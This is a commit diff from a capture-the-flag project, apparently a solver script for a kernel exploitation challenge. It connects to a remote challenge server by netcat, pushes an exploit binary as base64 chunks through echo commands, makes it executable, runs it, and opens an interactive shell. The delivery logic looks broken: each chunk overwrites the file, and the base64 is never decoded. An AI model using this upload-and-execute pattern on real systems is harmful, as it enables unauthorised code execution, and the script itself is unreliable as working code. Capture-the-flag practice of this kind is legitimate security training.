16855a564aaa6cfd04931770c66ea4d750ff49ee
Evan Hellman <ehellman@iastate.edu>
2022-10-02 21:52:27 -0400

    Progress on kernel adventures.

--- challenges/kernel_adventures_part_1/deliverer.py
+++ challenges/kernel_adventures_part_1/deliverer.py
@@ -3,8 +3,9 @@ import exploit_helper
 
 # Binary filename
 exe = "/bin/netcat"
-server_ip = "104.248.173.13"
-server_port = "30633"
+server_ip = "178.128.173.79"
+server_port = "31992"
+exploit_path = "cmake-build-debug/exploit"
 
 # Specify GDB script here (breakpoints etc.)
 gdb_script = '''
@@ -20,7 +21,20 @@ elf = context.binary = ELF(exe, checksec=False)
 
 io = exploit_helper.start(exe=exe, gdb_script=gdb_script, argv=[server_ip, server_port])
 
-io.readuntil(b"/ $ ")
+
+def send_command(command: bytes):
+    info(f"Sending command '{command}'")
+    io.readuntil(b"/ $ ")
+    io.sendline(command)
+
+
+with open(exploit_path, "rb") as exploit_file:
+    while (data := exploit_file.read(256)) != b"":
+        encoded_data: str = base64.b64encode(data).decode("ascii")
+        send_command(f"echo '{encoded_data}' > exploit".encode("ascii"))
+
+send_command(b"chmod +x exploit")
+
+send_command(b"./exploit")
 
 io.interactive()
-
